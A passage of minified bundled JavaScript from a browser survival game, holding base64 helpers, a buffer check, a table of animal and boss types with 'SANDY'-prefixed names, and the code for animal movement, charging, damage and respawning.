                                            for (var t = [], n = 0; n < e.length; n += 2) t.push(parseInt(e.substr(n, 2), 16));
                                            return t
                                        },
                                        bytesToBase64: function(e) {
                                            for (var n = [], i = 0; i < e.length; i += 3)
                                                for (var r = e[i] << 16 | e[i + 1] << 8 | e[i + 2], s = 0; s < 4; s++) 8 * i + 6 * s <= 8 * e.length ? n.push(t.charAt(r >>> 6 * (3 - s) & 63)) : n.push("=");
                                            return n.join("")
                                        },
                                        base64ToBytes: function(e) {
                                            e = e.replace(/[^A-Z0-9+\/]/gi, "");
                                            for (var n = [], i = 0, r = 0; i < e.length; r = ++i % 4) 0 != r && n.push((t.indexOf(e.charAt(i - 1)) & Math.pow(2, -2 * r + 8) - 1) << 2 * r | t.indexOf(e.charAt(i)) >>> 6 - 2 * r);
                                            return n
                                        }
                                    };
                                e.exports = n
                            }()
                        }, function(e, t) {
                            function n(e) {
                                return !!e.constructor && "function" == typeof e.constructor.isBuffer && e.constructor.isBuffer(e)
                            }
                            /*!
	 * Determine if an object is a Buffer
	 *
	 * @author   Feross Aboukhadijeh <https://feross.org>
	 * @license  MIT
	 */
                            e.exports = function(e) {
                                return null != e && (n(e) || function(e) {
                                    return "function" == typeof e.readFloatLE && "function" == typeof e.slice && n(e.slice(0, 0))
                                }(e) || !!e._isBuffer)
                            }
                        }, function(e, t) {
                            e.exports = function(e, t, n, i, r, s, a, o, c) {
                                this.aiTypes = [{
                                    id: 0,
                                    src: "cow_1",
                                    killScore: 150,
                                    health: 500,
                                    weightM: .8,
                                    speed: 95e-5,
                                    turnSpeed: .001,
                                    scale: 72,
                                    drop: ["food", 50]
                                }, {
                                    id: 1,
                                    src: "pig_1",
                                    killScore: 200,
                                    health: 800,
                                    weightM: .6,
                                    speed: 85e-5,
                                    turnSpeed: .001,
                                    scale: 72,
                                    drop: ["food", 80]
                                }, {
                                    id: 2,
                                    name: "SANDY Bull",
                                    src: "bull_2",
                                    hostile: !0,
                                    dmg: 20,
                                    killScore: 1e3,
                                    health: 1800,
                                    weightM: .5,
                                    speed: 94e-5,
                                    turnSpeed: 74e-5,
                                    scale: 78,
                                    viewRange: 800,
                                    chargePlayer: !0,
                                    drop: ["food", 100]
                                }, {
                                    id: 3,
                                    name: "SANDY Bully",
                                    src: "bull_1",
                                    hostile: !0,
                                    dmg: 20,
                                    killScore: 2e3,
                                    health: 2800,
                                    weightM: .45,
                                    speed: .001,
                                    turnSpeed: 8e-4,
                                    scale: 90,
                                    viewRange: 900,
                                    chargePlayer: !0,
                                    drop: ["food", 400]
                                }, {
                                    id: 4,
                                    name: "SANDY Wolf",
                                    src: "wolf_1",
                                    hostile: !0,
                                    dmg: 8,
                                    killScore: 500,
                                    health: 300,
                                    weightM: .45,
                                    speed: .001,
                                    turnSpeed: .002,
                                    scale: 84,
                                    viewRange: 800,
                                    chargePlayer: !0,
                                    drop: ["food", 200]
                                }, {
                                    id: 5,
                                    name: "SANDY Quack",
                                    src: "chicken_1",
                                    dmg: 8,
                                    killScore: 2e3,
                                    noTrap: !0,
                                    health: 300,
                                    weightM: .2,
                                    speed: .0018,
                                    turnSpeed: .006,
                                    scale: 70,
                                    drop: ["food", 100]
                                }, {
                                    id: 6,
                                    name: "SANDY MOOSTAFA",
                                    nameScale: 50,
                                    src: "enemy",
                                    hostile: !0,
                                    dontRun: !0,
                                    fixedSpawn: !0,
                                    spawnDelay: 6e4,
                                    noTrap: !0,
                                    colDmg: 100,
                                    dmg: 40,
                                    killScore: 8e3,
                                    health: 18e3,
                                    weightM: .4,
                                    speed: 7e-4,
                                    turnSpeed: .01,
                                    scale: 80,
                                    spriteMlt: 1.8,
                                    leapForce: .9,
                                    viewRange: 1e3,
                                    hitRange: 210,
                                    hitDelay: 1e3,
                                    chargePlayer: !0,
                                    drop: ["food", 100]
                                }, {
                                    id: 7,
                                    name: "SANDY Treasure",
                                    hostile: !0,
                                    nameScale: 35,
                                    src: "crate_1",
                                    fixedSpawn: !0,
                                    spawnDelay: 12e4,
                                    colDmg: 200,
                                    killScore: 5e3,
                                    health: 2e4,
                                    weightM: .1,
                                    speed: 0,
                                    turnSpeed: 0,
                                    scale: 70,
                                    spriteMlt: 1
                                }, {
                                    id: 8,
                                    name: "SANDY MOOFIE",
                                    src: "wolf_2",
                                    hostile: !0,
                                    fixedSpawn: !0,
                                    dontRun: !0,
                                    hitScare: 4,
                                    spawnDelay: 3e4,
                                    noTrap: !0,
                                    nameScale: 35,
                                    dmg: 10,
                                    colDmg: 100,
                                    killScore: 3e3,
                                    health: 7e3,
                                    weightM: .45,
                                    speed: .0015,
                                    turnSpeed: .002,
                                    scale: 90,
                                    viewRange: 800,
                                    chargePlayer: !0,
                                    drop: ["food", 1e3]
                                }], this.spawn = function(l, h, u, f) {
                                    for (var d, p = 0; p < e.length; ++p)
                                        if (!e[p].active) {
                                            d = e[p];
                                            break
                                        } return d || (d = new t(e.length, r, n, i, a, s, o, c), e.push(d)), d.init(l, h, u, f, this.aiTypes[f]), d
                                }
                            }
                        }, function(e, t) {
                            var n = 2 * Math.PI;
                            e.exports = function(e, t, i, r, s, a, o, c) {
                                this.sid = e, this.isAI = !0, this.nameIndex = s.randInt(0, a.cowNames.length - 1), this.init = function(e, t, n, i, r) {
                                    this.x = e, this.y = t, this.startX = r.fixedSpawn ? e : null, this.startY = r.fixedSpawn ? t : null, this.xVel = 0, this.yVel = 0, this.zIndex = 0, this.dir = n, this.dirPlus = 0, this.index = i, this.src = r.src, r.name && (this.name = r.name), this.weightM = r.weightM, this.speed = r.speed, this.killScore = r.killScore, this.turnSpeed = r.turnSpeed, this.scale = r.scale, this.maxHealth = r.health, this.leapForce = r.leapForce, this.health = this.maxHealth, this.chargePlayer = r.chargePlayer, this.viewRange = r.viewRange, this.drop = r.drop, this.dmg = r.dmg, this.hostile = r.hostile, this.dontRun = r.dontRun, this.hitRange = r.hitRange, this.hitDelay = r.hitDelay, this.hitScare = r.hitScare, this.spriteMlt = r.spriteMlt, this.nameScale = r.nameScale, this.colDmg = r.colDmg, this.noTrap = r.noTrap, this.spawnDelay = r.spawnDelay, this.hitWait = 0, this.waitCount = 1e3, this.moveCount = 0, this.targetDir = 0, this.active = !0, this.alive = !0, this.runFrom = null, this.chargeTarget = null, this.dmgOverTime = {}
                                };
                                var l = 0;
                                this.update = function(e) {
                                    if (this.active) {
                                        if (this.spawnCounter) return this.spawnCounter -= e, void(this.spawnCounter <= 0 && (this.spawnCounter = 0, this.x = this.startX || s.randInt(0, a.mapScale), this.y = this.startY || s.randInt(0, a.mapScale)));
                                        (l -= e) <= 0 && (this.dmgOverTime.dmg && (this.changeHealth(-this.dmgOverTime.dmg, this.dmgOverTime.doer), this.dmgOverTime.time -= 1, this.dmgOverTime.time <= 0 && (this.dmgOverTime.dmg = 0)), l = 1e3);
                                        var r = !1,
                                            o = 1;
                                        if (!this.zIndex && !this.lockMove && this.y >= a.mapScale / 2 - a.riverWidth / 2 && this.y <= a.mapScale / 2 + a.riverWidth / 2 && (o = .33, this.xVel += a.waterCurrent * e), this.lockMove) this.xVel = 0, this.yVel = 0;
                                        else if (this.waitCount > 0) {
                                            if (this.waitCount -= e, this.waitCount <= 0)
                                                if (this.chargePlayer) {
                                                    for (var h, u, f, d = 0; d < i.length; ++d) !i[d].alive || i[d].skin && i[d].skin.bullRepel || (f = s.getDistance(this.x, this.y, i[d].x, i[d].y)) <= this.viewRange && (!h || f < u) && (u = f, h = i[d]);
                                                    h ? (this.chargeTarget = h, this.moveCount = s.randInt(8e3, 12e3)) : (this.moveCount = s.randInt(1e3, 2e3), this.targetDir = s.randFloat(-Math.PI, Math.PI))
                                                } else this.moveCount = s.randInt(4e3, 1e4), this.targetDir = s.randFloat(-Math.PI, Math.PI)
                                        } else if (this.moveCount > 0) {
                                            var p = this.speed * o;
                                            if (this.runFrom && this.runFrom.active && (!this.runFrom.isPlayer || this.runFrom.alive) ? (this.targetDir = s.getDirection(this.x, this.y, this.runFrom.x, this.runFrom.y), p *= 1.42) : this.chargeTarget && this.chargeTarget.alive && (this.targetDir = s.getDirection(this.chargeTarget.x, this.chargeTarget.y, this.x, this.y), p *= 1.75, r = !0), this.hitWait && (p *= .3), this.dir != this.targetDir) {
                                                this.dir %= n;
                                                var g = (this.dir - this.targetDir + n) % n,
                                                    m = Math.min(Math.abs(g - n), g, this.turnSpeed * e),
                                                    y = g - Math.PI >= 0 ? 1 : -1;
                                                this.dir += y * m + n
                                            }
                                            this.dir %= n, this.xVel += p * e * Math.cos(this.dir), this.yVel += p * e * Math.sin(this.dir), this.moveCount -= e, this.moveCount <= 0 && (this.runFrom = null, this.chargeTarget = null, this.waitCount = this.hostile ? 1500 : s.randInt(1500, 6e3))
                                        }
                                        this.zIndex = 0, this.lockMove = !1;
                                        var k = s.getDistance(0, 0, this.xVel * e, this.yVel * e),
                                            v = Math.min(4, Math.max(1, Math.round(k / 40))),
                                            w = 1 / v;
                                        for (d = 0; d < v; ++d) {
                                            this.xVel && (this.x += this.xVel * e * w), this.yVel && (this.y += this.yVel * e * w), M = t.getGridArrays(this.x, this.y, this.scale);
                                            for (var b = 0; b < M.length; ++b)
                                                for (var x = 0; x < M[b].length; ++x) M[b][x].active && t.checkCollision(this, M[b][x], w)
                                        }
                                        var S, T, I, E = !1;
                                        if (this.hitWait > 0 && (this.hitWait -= e, this.hitWait <= 0)) {
                                            E = !0, this.hitWait = 0, this.leapForce && !s.randInt(0, 2) && (this.xVel += this.leapForce * Math.cos(this.dir), this.yVel += this.leapForce * Math.sin(this.dir));
                                            for (var M = t.getGridArrays(this.x, this.y, this.hitRange), A = 0; A < M.length; ++A)
                                                for (b = 0; b < M[A].length; ++b)(S = M[A][b]).health && (T = s.getDistance(this.x, this.y, S.x, S.y)) < S.scale + this.hitRange && (S.changeHealth(5 * -this.dmg) && t.disableObj(S), t.hitObj(S, s.getDirection(this.x, this.y, S.x, S.y)));
                                            for (b = 0; b < i.length; ++b) i[b].canSee(this) && c.send(i[b].id, "aa", this.sid)
                                        }
                                        if (r || E)
                                            for (d = 0; d < i.length; ++d)(S = i[d]) && S.alive && (T = s.getDistance(this.x, this.y, S.x, S.y), this.hitRange ? !this.hitWait && T <= this.hitRange + S.scale && (E ? (I = s.getDirection(S.x, S.y, this.x, this.y), S.changeHealth(-this.dmg), S.xVel += .6 * Math.cos(I), S.yVel += .6 * Math.sin(I), this.runFrom = null, this.chargeTarget = null, this.waitCount = 3e3, this.hitWait = s.randInt(0, 2) ? 0 : 600) : this.hitWait = this.hitDelay) : T <= this.scale + S.scale && (I = s.getDirection(S.x, S.y, this.x, this.y), S.changeHealth(-this.dmg), S.xVel += .55 * Math.cos(I), S.yVel += .55 * Math.sin(I)));
                                        this.xVel && (this.xVel *= Math.pow(a.playerDecel, e)), this.yVel && (this.yVel *= Math.pow(a.playerDecel, e));
                                        var P = this.scale;
                                        this.x - P < 0 ? (this.x = P, this.xVel = 0) : this.x + P > a.mapScale && (this.x = a.mapScale - P, this.xVel = 0), this.y - P < 0 ? (this.y = P, this.yVel = 0) : this.y + P > a.mapScale && (this.y = a.mapScale - P, this.yVel = 0)
                                    }
                                }, this.canSee = function(e) {
                                    if (!e) return !1;
                                    if (e.skin && e.skin.invisTimer && e.noMovTimer >= e.skin.invisTimer) return !1;
                                    var t = Math.abs(e.x - this.x) - e.scale,
                                        n = Math.abs(e.y - this.y) - e.scale;
                                    return t <= a.maxScreenWidth / 2 * 1.3 && n <= a.maxScreenHeight / 2 * 1.3
                                };
                                var h = 0,
                                    u = 0;
                                this.animate = function(e) {
                                    this.animTime > 0 && (this.animTime -= e, this.animTime <= 0 ? (this.animTime = 0, this.dirPlus = 0, h = 0, u = 0) : 0 == u ? (h += e / (this.animSpeed * a.hitReturnRatio), this.dirPlus = s.lerp(0, this.targetAngle, Math.min(1, h)), h >= 1 && (h = 1, u = 1)) : (h -= e / (this.animSpeed * (1 - a.hitReturnRatio)), this.dirPlus = s.lerp(0, this.targetAngle, Math.max(0, h))))
                                }, this.startAnim = function() {
                                    this.animTime = this.animSpeed = 600, this.targetAngle = .8 * Math.PI, h = 0, u = 0
                                }, this.changeHealth = function(e, t, n) {
                                    if (this.active && (this.health += e, n && (this.hitScare && !s.randInt(0, this.hitScare) ? (this.runFrom = n, this.waitCount = 0, this.moveCount = 2e3) : this.hostile && this.chargePlayer && n.isPlayer ? (this.chargeTarget = n, this.waitCount = 0, this.moveCount = 8e3) : this.dontRun || (this.runFrom = n, this.waitCount = 0, this.moveCount = 2e3)), e < 0 && this.hitRange && s.randInt(0, 1) && (this.hitWait = 500), t && t.canSee(this) && e < 0 && c.send(t.id, "t", Math.round(this.x), Math.round(this.y), Math.round(-e), 1), this.health <= 0 && (this.spawnDelay ? (this.spawnCounter = this.spawnDelay, this.x = -1e6, this.y = -1e6) : (this.x = this.startX || s.randInt(0, a.mapScale), this.y = this.startY || s.randInt(0, a.mapScale)), this.health = this.maxHealth, this.runFrom = null, t && (o(t, this.killScore), this.drop))))
                                        for (var i = 0; i < this.drop.length;) t.addResource(a.resourceTypes.indexOf(this.drop[i]), this.drop[i + 1]), i += 2
                                }
                            }
                        }
]);